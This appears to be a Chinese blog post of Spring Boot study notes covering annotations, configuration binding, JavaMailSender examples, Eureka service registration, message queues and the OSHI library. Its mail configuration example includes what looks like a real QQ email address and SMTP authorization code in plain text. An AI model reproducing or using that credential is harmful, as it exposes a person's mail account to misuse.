class="built_in">String</span>,<span class="built_in">Object</span>&gt; params)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"name:"</span> + params.<span class="keyword">get</span>(<span class="string">"name"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>@GetMapping 组合注解  @RequestMapping(method = RequestMethod.GET)缩写 </li></ul><h4 id="SpringBootApplication"><a href="#SpringBootApplication" class="headerlink" title="@SpringBootApplication"></a>@SpringBootApplication</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@Configuration</span><span class="built_in">`、`</span><span class="variable">@EnableAutoConfiguration</span><span class="built_in">`、`</span><span class="variable">@ComponentScan</span></span><br></pre></td></tr></table></figure><p>@EnableAutoConfiguration : 启动SpringBoot 自动装配机制 </p><p>@Configuration: 允许在上下文中注册额外的bean或导入其它    配置类 </p><p>@Component : 扫描被@Commponent(@Service, @Controller)注解的bean , 注解会默认扫描启动类所在的包下所有类 ,可以自定义不扫描某些bean</p><p><img src="../images/java_web/bcc73490afbe4c6ba62acde6a94ffdfd~tplv-k3u1fbpfcp-watermark.png" alt="img"></p><p>容器排除 TypeExcludeFilter 和 AutoConfigurtionExcludeFilter </p><p>@ComponentScan</p><h4 id="RequestBody"><a href="#RequestBody" class="headerlink" title="@RequestBody"></a>@RequestBody</h4><p>将HttpRequest body 中的JSON类型数据反序列化为合适的Java类型   ,  以实体类方式接受json数据</p><h4 id="Configuation"><a href="#Configuation" class="headerlink" title="@Configuation"></a>@Configuation</h4><p>标注在类上,相当于把该类作为Spring的xml文件中的<beans>, 作用为: 配置spring容器</p><h4 id="Bean"><a href="#Bean" class="headerlink" title="@Bean"></a>@Bean</h4><p>@Bean标注在返回实例的方法上, 等价于<bean>, 注册为bean对象</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">public</span> <span class="selector-tag">class</span> <span class="selector-tag">Test</span>&#123;</span><br><span class="line"><span class="variable">@Bean</span></span><br><span class="line"><span class="variable">@Scope</span>(<span class="string">"protorype"</span>)</span><br><span class="line">public  A test()&#123;</span><br><span class="line"><span class="selector-tag">return</span> <span class="selector-tag">new</span> <span class="selector-tag">A</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>//@Bean注解注册bean,同时可以指定初始化和销毁方法</em>    <em>//@Bean(name=”testNean”,initMethod=”start”,destroyMethod=”cleanUp”)</em></p><h4 id="Async"><a href="#Async" class="headerlink" title="@Async"></a>@Async</h4><p>异步查询结果 </p><p><img src="../images/java_web/image-20210428232251726.png" alt="image-20210428232251726"></p><h3 id="读取配置"><a href="#读取配置" class="headerlink" title="读取配置"></a>读取配置</h3><h4 id="configurationProperties-读取并于bean绑定"><a href="#configurationProperties-读取并于bean绑定" class="headerlink" title="@configurationProperties 读取并于bean绑定"></a>@configurationProperties 读取并于bean绑定</h4><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">wuhan2020:</span> <span class="number">2020</span><span class="string">年初武汉爆发了新型冠状病毒，疫情严重，但是，我相信一切都会过去！武汉加油！中国加油！</span></span><br><span class="line"></span><br><span class="line"><span class="attr">my-profile:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">Guide哥</span></span><br><span class="line">  <span class="attr">email:</span> <span class="string">koushuangbwcx@163.com</span></span><br><span class="line"></span><br><span class="line"><span class="attr">library:</span></span><br><span class="line">  <span class="attr">location:</span> <span class="string">湖北武汉加油中国加油</span></span><br><span class="line">  <span class="attr">books:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">天才基本法</span></span><br><span class="line">      <span class="attr">description:</span> <span class="string">二十二岁的林朝夕在父亲确诊阿尔茨海默病这天，得知自己暗恋多年的校园男神裴之即将出国深造的消息——对方考取的学校，恰是父亲当年为她放弃的那所。</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">时间的秩序</span></span><br><span class="line">      <span class="attr">description:</span> <span class="string">为什么我们记得过去，而非未来？时间“流逝”意味着什么？是我们存在于时间之内，还是时间存在于我们之中？卡洛·罗韦利用诗意的文字，邀请我们思考这一亘古难题——时间的本质。</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">了不起的我</span></span><br><span class="line">      <span class="attr">description:</span> <span class="string">如何养成一个新习惯？如何让心智变得更成熟？如何拥有高质量的关系？</span> <span class="string">如何走出人生的艰难时刻？</span></span><br></pre></td></tr></table></figure><p><img src="../images/java_web/image-20210420200151167.png" alt="image-20210420200151167"></p><p>spring加载配置文件的优先级</p><p><img src="../images/java_web/68747470733a2f2f6d792d626c6f672d746f2d7573652e6f73732d636e2d6265696a696e672e616c6979756e63732e636f6d2f323031392d31312f726561642d636f6e6669672d70726f706572746965732d7072696f726974792e6a7067.png" alt="img"></p><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><h4 id="ResponseEntity"><a href="#ResponseEntity" class="headerlink" title="ResponseEntity"></a>ResponseEntity</h4><p>表示整个HTTP Response : 状态码 ,表头和正文内容. 可以使用它来定义HTTP Response 的内容 </p><h4 id="spring-boot-starter-Mail"><a href="#spring-boot-starter-Mail" class="headerlink" title="spring-boot-starter-Mail"></a>spring-boot-starter-Mail</h4><p><a href="https://mp.weixin.qq.com/s?__biz=MzI1MDIxNjQ1OQ==&mid=2247483764&idx=1&sn=8cee8b1781b8659b3fdc23c0d650db49&chksm=e984e810def3610640e741eea1f94bbf95d4a2a5b1c68946829a036b4a6bc58b0d23e156474a&cur_album_id=1361542504662908929&scene=189#rd" target="_blank" rel="noopener">参考</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JavaMailSender</span><br></pre></td></tr></table></figure><p>简单用法</p><p>配置 文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring.mail.host</span>=smtp.qq.com</span><br><span class="line"><span class="attr">spring.mail.port</span>=<span class="number">587</span></span><br><span class="line"><span class="comment"># 你的邮箱地址</span></span><br><span class="line"><span class="attr">spring.mail.username</span>=<span class="number">2233451206</span>@qq.com</span><br><span class="line"><span class="comment">#授权码</span></span><br><span class="line"><span class="attr">spring.mail.password</span>=xvkqcuzqfgorebfa</span><br><span class="line"><span class="attr">spring.mail.default-encoding</span>=UTF-<span class="number">8</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span>  <span class="class"><span class="keyword">class</span> <span class="title">MailService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;spring.mail.username&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> String from;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JavaMailSender mailsender;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span>  <span class="title">sendSmipleTextMail</span><span class="params">(String to , String subject, String content)</span></span>&#123;</span><br><span class="line">        SimpleMailMessage message = <span class="keyword">new</span> SimpleMailMessage( );</span><br><span class="line">        message.setTo(to);</span><br><span class="line">        message.setSubject(subject);</span><br><span class="line">        message.setText(content);</span><br><span class="line">        message.setFrom(from);</span><br><span class="line">        mailsender.send(message);</span><br><span class="line">        log.info(<span class="string">"[文本邮件]发送成功! to=&#123; &#125;"</span>,to);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RunWith</span>(SpringRunner<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">@<span class="title">SpringBootTest</span></span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">MailServiceTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> MailService mailService;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> TemplateEngine templateEngine;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendSimpleTextMailTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String to = <span class="string">"2233451206@qq.com"</span>;</span><br><span class="line">        String subject = <span class="string">"Spring boot 发送简单邮件"</span>;</span><br><span class="line">        String contentment = <span class="string">"&lt;p&gt;第一封SpringBoot 简单文本邮件&lt;/p&gt;"</span>;</span><br><span class="line">        mailService.sendSmipleTextMail(to,subject,contentment);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>to为收件人地址 </p><p><img src="../images/java_web/image-20210422161537587.png" alt="image-20210422161537587"></p><h5 id="发送html文件"><a href="#发送html文件" class="headerlink" title="发送html文件"></a>发送html文件</h5><p>使用 </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">javax</span><span class="selector-class">.mail</span><span class="selector-class">.internet</span><span class="selector-class">.MimeMessage</span>;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SendHtmlMail</span><span class="params">(String to,String subject,String content )</span> <span class="keyword">throws</span> MessagingException </span>&#123;</span><br><span class="line">     MimeMessage message = mailsender.createMimeMessage();</span><br><span class="line">     MimeMessageHelper messageHelper = <span class="keyword">new</span> MimeMessageHelper(message,<span class="keyword">true</span>);</span><br><span class="line">     messageHelper.setFrom(from);</span><br><span class="line">     messageHelper.setTo(to);</span><br><span class="line">     messageHelper.setSubject(subject);</span><br><span class="line">     <span class="comment">//true 为HTML 邮件</span></span><br><span class="line">     messageHelper.setText(content,<span class="keyword">true</span>)</span><br><span class="line">         ;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>发送图片</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 发送带图片的邮件</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> to</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> subject</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> content</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> imgMap</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendImgMail</span><span class="params">(String to, String subject, String content, Map&lt;String, String&gt; imgMap)</span></span></span><br><span class="line"><span class="function">      <span class="keyword">throws</span> MessagingException </span>&#123;</span><br><span class="line">      MimeMessage mimeMessage = mailSender.createMimeMessage();</span><br><span class="line">      MimeMessageHelper messageHelper = <span class="keyword">new</span> MimeMessageHelper(mimeMessage, <span class="keyword">true</span>);</span><br><span class="line">      messageHelper.setFrom(from);</span><br><span class="line">      messageHelper.setTo(to);</span><br><span class="line">      messageHelper.setSubject(subject);</span><br><span class="line">      messageHelper.setText(content, <span class="keyword">true</span>);</span><br><span class="line">      <span class="comment">// 添加图片</span></span><br><span class="line">      <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : imgMap.entrySet()) &#123;</span><br><span class="line">          FileSystemResource fileResource = <span class="keyword">new</span> FileSystemResource(<span class="keyword">new</span> File(entry.getValue()));</span><br><span class="line">          <span class="keyword">if</span> (fileResource.exists()) &#123;</span><br><span class="line">              String filename = fileResource.getFilename();</span><br><span class="line">              messageHelper.addInline(entry.getKey(), fileResource);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      mailSender.send(mimeMessage);</span><br><span class="line">      log.info(<span class="string">"【图片邮件】成功发送！to=&#123;&#125;"</span>, to);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>测试类中方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendImgTest</span><span class="params">()</span> <span class="keyword">throws</span> MessagingException </span>&#123;</span><br><span class="line">       String to = <span class="string">"niumoo@126.com"</span>;</span><br><span class="line">       String subject = <span class="string">"Springboot 发送 HTML 图片邮件"</span>;</span><br><span class="line">       String content =</span><br><span class="line">           <span class="string">"&lt;h2&gt;Hi~&lt;/h2&gt;&lt;p&gt;第一封 Springboot HTML 图片邮件&lt;/p&gt;&lt;br/&gt;&lt;img src=\"cid:img01\" /&gt;&lt;img src=\"cid:img02\" /&gt;"</span>;</span><br><span class="line">       String imgPath = <span class="string">"apple.png"</span>;</span><br><span class="line">       Map&lt;String, String&gt; imgMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">       imgMap.put(<span class="string">"img01"</span>, imgPath);</span><br><span class="line">       imgMap.put(<span class="string">"img02"</span>, imgPath);</span><br><span class="line">       mailService.sendImgMail(to, subject, content, imgMap);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h4 id="mail模板邮件"><a href="#mail模板邮件" class="headerlink" title="mail模板邮件"></a>mail模板邮件</h4><p>模板邮件用处很广泛,注册成功邮件或者是操作通知邮件等都是模板邮件, 模板邮件往往只需更改其中的几个变量, Springboot中的模板邮件首选需要选择一款模板引擎 , 比如 Thymeleaf </p><h3 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h3><p>如果将所有微服务放在一台服务器上部署或者在本地运行时, 注意端口号(server.port) 不要重复, 否则会报端口被占用的错误</p><p>服务注册就是维护一个登记簿, 它管理系统内所有的服务地址. 当新的服务启动后, 它回想登记簿交代自己的地址信息. 服务的依赖方直接向登记簿索要 Service Provider 地址就行 , </p><p>当前用于服务注册的工具非常多  ooKeeper，Consul，Etcd, 还有 Netflix 家的 eureka 等 </p><p>服务注册 </p><ul><li>客户端注册 </li><li>第三方注册</li></ul><p>微服务就是很小的服务, 小到一个服务只对应一个单一的共能, 只做一件事 .这个服务可以单独部署运行, 服务之间可以通过RPC(远程调用)来相互交互</p><h4 id="微服务架构"><a href="#微服务架构" class="headerlink" title="微服务架构"></a>微服务架构</h4><p>在做架构设计的时候，先做逻辑架构，再做物理架构，当你拿到需求后，估算过最大用户量和并发量后，计算单个应用服务器能否满足需求，如果用户量只有几百人的小应用，单体应用就能搞定，即所有应用部署在一个应用服务器里，如果是很大用户量，且某些功能会被频繁访问，或者某些功能计算量很大，建议将应用拆解为多个子系统，各自负责各自功能，这就是微服务架构</p><h4 id="客户端注册"><a href="#客户端注册" class="headerlink" title="客户端注册"></a>客户端注册</h4><p>客户端注册是服务自身要负责注册与注销的工作, 当服务启动后向注册中心注册自身,当服务下线时注销自己. 期间还需要和注册中心保持心跳 </p><h4 id="第三方注册-独立的服务Registrar"><a href="#第三方注册-独立的服务Registrar" class="headerlink" title="第三方注册(独立的服务Registrar)"></a>第三方注册(独立的服务Registrar)</h4><p>第三方注册由一个独立的服务Registar负责注册与注销, 当服务启动后以某种方式通知Registrar,然后Registar 负责向注册中心发起注册工作. 同时注册中心要维护与服务之间的心跳, 当服务不可用时, 向注册中心注销服务, 这种方式的缺点是 Registar 必须是一个高可用的系统, 否则注册工作没法进展 </p><h4 id="客户端发现"><a href="#客户端发现" class="headerlink" title="客户端发现"></a>客户端发现</h4><p>客户端发现是指负责查询可用服务地址, 以及负载均衡的工作. 这种方式最直接, 而且也方便做负载均衡. 再者一旦发现某个服务不可用立即换另外一个，非常直接。缺点也在于多 语言时的重复工作，每个语言实现相同的逻辑</p><p><img src="../images/java_web/image-20210426234601269.png" alt="image-20210426234601269"></p><h4 id="服务端发现"><a href="#服务端发现" class="headerlink" title="服务端发现"></a>服务端发现</h4><p>服务端发现需要额外的Router 服务, 请求先打到Router, 然后Router 负责查询服务与负载均衡. 这种方式虽然没有客户端发现的缺点, 但是它的缺点是Router 的高可用</p><p><img src="../images/java_web/image-20210426234614452.png" alt="image-20210426234614452"></p><h4 id="Eureka"><a href="#Eureka" class="headerlink" title="Eureka"></a>Eureka</h4><p>Spring Cloud Eureka 可以快速实现服务注册与发现 </p><p><img src="../images/java_web/image-20210426233731896.png" alt="image-20210426233731896"></p><h5 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h5><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">lease-renewal-interval-in-seconds:</span> <span class="number">20</span>  <span class="comment">#发送心跳, 表示当前服务没有宕机</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span>  <span class="comment"># 注册到eureka 服务上, 默认为true , 这里是eureka Server</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">true</span>   <span class="comment"># 是否从eureka服务上获取注册信息 ,这里是单点, 不用同步其它eureka 服务节点上数据</span></span><br><span class="line">    <span class="attr">initial-instance-info-replication-interval-seconds:</span> <span class="number">30</span> <span class="comment"># 新实例信息的变化到Eureka服务端的间隔时间，单位为秒</span></span><br><span class="line">    <span class="attr">registry-fetch-interval-seconds:</span> <span class="number">10</span>  <span class="comment"># 获取服务并缓存</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:8761/eureka</span></span><br></pre></td></tr></table></figure><h4 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h4><p>将用户请求数据写入消息队列, 可以将订单数据返回给用户, 等消息队列中的请求数据进程处理完订单后, 甚至出库后, 再将订单成功的消息通过邮件或者短信通知用户订单成功</p><p>使用消息队列能为我们的系统带来下面三点好处 </p><ol><li><strong>通过异步处理提高系统性能（减少响应所需时间）。</strong></li><li><strong>削峰/限流</strong></li><li><strong>降低系统耦合性。</strong></li></ol><p>结合自己项目进行回答</p><h5 id="削峰-限流"><a href="#削峰-限流" class="headerlink" title="削峰/限流"></a><strong>削峰/限流</strong></h5><p><strong>先将短时间高并发产生的事务消息存储在消息队列中，然后后端服务再慢慢根据自己的能力去消费这些消息，这样就避免直接把后端服务打垮掉。</strong></p><p>举例：在电子商务一些秒杀、促销活动中，合理使用消息队列可以有效抵御促销活动刚开始大量订单涌入对系统的冲击。如下图所示：</p><p><img src="../images/java_web/%E5%89%8A%E5%B3%B0-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.png" alt="削峰"></p><h5 id="降低系统耦合性"><a href="#降低系统耦合性" class="headerlink" title="降低系统耦合性"></a>降低系统耦合性</h5><p> 使用消息队列还可以降低系统耦合性。我们知道如果模块之间不存在直接调用，那么新增模块或者修改模块就对其他模块影响较小，这样系统的可扩展性无疑更好一些。还是直接上图吧：</p><p><img src="../images/java_web/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97-%E8%A7%A3%E8%80%A6.png" alt="解耦"></p><p>生产者（客户端）发送消息到消息队列中去，接受者（服务端）处理消息，需要消费的系统直接去消息队列取消息进行消费即可而不需要和其他系统有耦合， 这显然也提高了系统的扩展性。</p><p><strong>消息队列使利用发布-订阅模式工作，消息发送者（生产者）发布消息，一个或多个消息接受者（消费者）订阅消息。</strong> 从上图可以看到<strong>消息发送者（生产者）和消息接受者（消费者）之间没有直接耦合</strong>，消息发送者将消息发送至分布式消息队列即结束对消息的处理，消息接受者从分布式消息队列获取该消息后进行后续处理，并不需要知道该消息从何而来。<strong>对新增业务，只要对该类消息感兴趣，即可订阅该消息，对原有系统和业务没有任何影响，从而实现网站业务的可扩展性设计</strong>。</p><p>消息接受者对消息进行过滤、处理、包装后，构造成一个新的消息类型，将消息继续发送出去，等待其他消息接受者订阅该消息。因此基于事件（消息对象）驱动的业务架构可以是一系列流程。</p><p>另外，为了避免消息队列服务器宕机造成消息丢失，会将成功发送到消息队列的消息存储在消息生产者服务器上，等消息真正被消费者服务器处理后才删除消息。在消息队列服务器宕机后，生产者服务器会选择分布式消息队列服务器集群中的其他服务器发布消息。</p><p><strong>备注：</strong> 不要认为消息队列只能利用发布-订阅模式工作，只不过在解耦这个特定业务环境下是使用发布-订阅模式的。除了发布-订阅模式，还有点对点订阅模式（一个消息只有一个消费者），我们比较常用的是发布-订阅模式。另外，这两种消息模型是 JMS 提供的，AMQP 协议还提供了 5 种消息模型。</p><h5 id="带来的问题"><a href="#带来的问题" class="headerlink" title="带来的问题"></a>带来的问题</h5><ul><li><strong>系统可用性降低：</strong> 系统可用性在某种程度上降低，为什么这样说呢？在加入 MQ 之前，你不用考虑消息丢失或者说 MQ 挂掉等等的情况，但是，引入 MQ 之后你就需要去考虑了！</li><li><strong>系统复杂性提高：</strong> 加入 MQ 之后，你需要保证消息没有被重复消费、处理消息丢失的情况、保证消息传递的顺序性等等问题！</li><li><strong>一致性问题：</strong> 我上面讲了消息队列可以实现异步，消息队列带来的异步确实可以提高系统响应速度。但是，万一消息的真正消费者并没有正确消费消息怎么办？这样就会导致数据不一致的情况了!</li></ul><p>JMS （JAVA Message Service,java 消息服务）是 java 的消息服务 </p><p> AMQP ，即 Advanced Message Queuing Protocol，一个提供统一消息服务的应用层标准 <strong>高级消息队列协议</strong>（二进制应用层协议），是应用层协议的一个开放标准,为面向消息的中间件设计，兼容 JMS。基于此协议的客户端与消息中间件可传递消息，并不受客户端/中间件同产品，不同的开发语言等条件的限制。</p><h4 id="oshi-工具包"><a href="#oshi-工具包" class="headerlink" title="oshi(工具包)"></a>oshi(工具包)</h4><p>监控本机状态, 内存和CPU使用率, 磁盘和 分区使用情况, 设备 , 传感器等</p><p>项目监控功能</p><p> 引入依赖</p><p>Maven</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.github.oshi/oshi-core --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.oshi<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>oshi-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Gradle</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://mvnrepository.com/artifact/com.github.oshi/oshi-core</span></span><br><span class="line">compile <span class="string">group:</span> <span class="string">'com.github.oshi'</span>, <span class="string">name:</span> <span class="string">'oshi-core'</span>, <span class="string">version:</span> <span class="string">'5.2.5'</span></span><br></pre></td></tr></table></figure><p> 功能演示</p><p>获取硬件信息对象<code>HardwareAbstractionLayer</code> ：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//系统信息</span></span><br><span class="line">SystemInfo si = <span class="keyword">new</span> <span class="constructor">SystemInfo()</span>;</span><br><span class="line"><span class="comment">//操作系统信息</span></span><br><span class="line">OperatingSystem os = si.get<span class="constructor">OperatingSystem()</span>;</span><br><span class="line"><span class="comment">//硬件信息</span></span><br><span class="line">HardwareAbstractionLayer hal = si.get<span class="constructor">Hardware()</span>;</span><br></pre></td></tr></table></figure><p>有了代表硬件信息的对象<code>HardwareAbstractionLayer</code> 之后，我们就可以获取硬件相关的信息了！</p><p>下面简单演示一下获取内存和 CPU 相关信息。</p><p><strong>1.获取内存相关信息</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//内存相关信息</span></span><br><span class="line">GlobalMemory memory = hal.get<span class="constructor">Memory()</span>;</span><br><span class="line"><span class="comment">//获取内存总容量</span></span><br><span class="line">String totalMemory = <span class="module-access"><span class="module"><span class="identifier">FormatUtil</span>.</span></span>format<span class="constructor">Bytes(<span class="params">memory</span>.<span class="params">getTotal</span>()</span>);</span><br><span class="line"><span class="comment">//获取可用内存的容量</span></span><br><span class="line">String availableMemory = <span class="module-access"><span class="module"><span class="identifier">FormatUtil</span>.</span></span>format<span class="constructor">Bytes(<span class="params">memory</span>.<span class="params">getAvailable</span>()</span>);</span><br></pre></td></tr></table></figure><p>有了内存总容量和内存可用容量，你就可以计算出当前内存的利用率了。</p><p><strong>2.获取 CPU 相关信息</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//CPU相关信息</span></span><br><span class="line">CentralProcessor processor = hal.get<span class="constructor">Processor()</span>;</span><br><span class="line"><span class="comment">//获取CPU名字</span></span><br><span class="line">String processorName = processor.get<span class="constructor">ProcessorIdentifier()</span>.get<span class="constructor">Name()</span>;</span><br><span class="line"><span class="comment">//获取物理CPU数</span></span><br><span class="line"><span class="built_in">int</span> physicalPackageCount = processor.get<span class="constructor">PhysicalPackageCount()</span>;</span><br><span class="line"><span class="comment">//获取物理核心数</span></span><br><span class="line"><span class="built_in">int</span> physicalProcessorCount = processor.get<span class="constructor">PhysicalProcessorCount()</span>;</span><br></pre></td></tr></table></figure><h4 id="EasyExcel-工具包"><a href="#EasyExcel-工具包" class="headerlink" title="EasyExcel (工具包)"></a>EasyExcel (工具包)</h4><p>快速,简单避免OOM的java 处理Excel 工具</p><p> 引入依赖</p><p>Maven</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 